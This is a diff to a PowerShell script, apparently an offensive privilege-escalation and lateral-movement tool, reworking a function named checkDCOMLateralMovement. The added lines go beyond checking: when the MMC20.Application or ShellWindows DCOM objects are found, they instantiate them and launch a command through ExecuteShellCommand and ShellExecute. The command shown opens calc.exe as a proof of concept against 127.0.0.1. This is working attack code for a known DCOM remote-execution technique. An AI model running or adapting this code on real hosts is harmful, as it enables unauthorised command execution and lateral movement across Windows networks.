@@ -1288,12 +1288,10 @@ function checkDCOMLateralMovement {
     # Get the mapping of localized users
     $localizedUser = Get-LocalizedUserMapping
 
-    # We compare localized <=> localized, we could of course do SID <=> SID instead
-
     # Define trusted identities using localized names
     $trustedIdentities = @(
-             $localizedUser['nt authority\system'].LocalizedName,
-             $localizedUser['administrators'].LocalizedName
+        $localizedUser['nt authority\system'].LocalizedName,
+        $localizedUser['administrators'].LocalizedName
     )
 
     # Define localized low-priv user identifiers
@@ -1305,7 +1303,7 @@ function checkDCOMLateralMovement {
 
     try {
         Write-Output "[*] Checking for DCOM misconfigurations..."
-        $dcomApplications = Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplication"
+        $dcomApplications = Get-CimInstance Win32_DCOMApplication
         
         if ($dcomApplications) {
             Write-Output "[+] DCOM Applications detected, analyzing permissions. This will take a minute..."
@@ -1313,9 +1311,37 @@ function checkDCOMLateralMovement {
             foreach ($app in $dcomApplications) {
                 # Check if it's running as an elevated user (like SYSTEM or Administrator)
                 $appID = $app.AppID
-                $appName = $app.Description
-                $appSetting = Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplicationSetting WHERE AppID='$appID'"
+                $appName = $app.Name
+                $appSetting = Get-CimInstance -Query "SELECT * FROM Win32_DCOMApplicationSetting WHERE AppID='$appID'"
                 $runAsUser = "None"
+
+                 # Check specifically for MMC20.Application
+                 if ($appName -like "*MMC20*") {
+                    Write-Output "[+] Found MMC20.Application: $appID"
+                    # Here we can directly execute a command via MMC20.Application
+                    try {
+                        $com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", "127.0.0.1")) # Example IP
+                        $com.Document.ActiveView.ExecuteShellCommand("cmd.exe", "/c calc.exe")
+                        Write-Output "[+] Command executed via MMC20.Application on local host."
+                    } catch {
+                        Write-Output "[-] Error executing command via MMC20.Application: $_"
+                    }
+                }
+
+                # Check specifically for ShellWindows
+                if ($appName -eq "ShellWindows") { # ShellWindows CLSID
+                    Write-Output "[+] Found ShellWindows: $appID"
+                    # Execute a command via ShellWindows
+                    try {
+                        $com = [Type]::GetTypeFromCLSID($appID)
+                        $obj = [System.Activator]::CreateInstance($com)
+                        $item = $obj.Item()
+                        $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
+                        Write-Output "[+] Command executed via ShellWindows on local host."
+                    } catch {
+                        Write-Output "[-] Error executing command via ShellWindows: $_"
+                    }
+                }
 
                 if ($appSetting.RunAsUser) {
                     $runAsUser = $localizedUser[$appSetting.RunAsUser.ToLower()].LocalizedName
@@ -1353,7 +1379,6 @@ function checkDCOMLateralMovement {
         Write-Output "[-] Error checking DCOM movement: $_"
     }
 }
-
 
 function tryDCOMLateralMovement {
     if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via DCOM Lateral Movement..." }
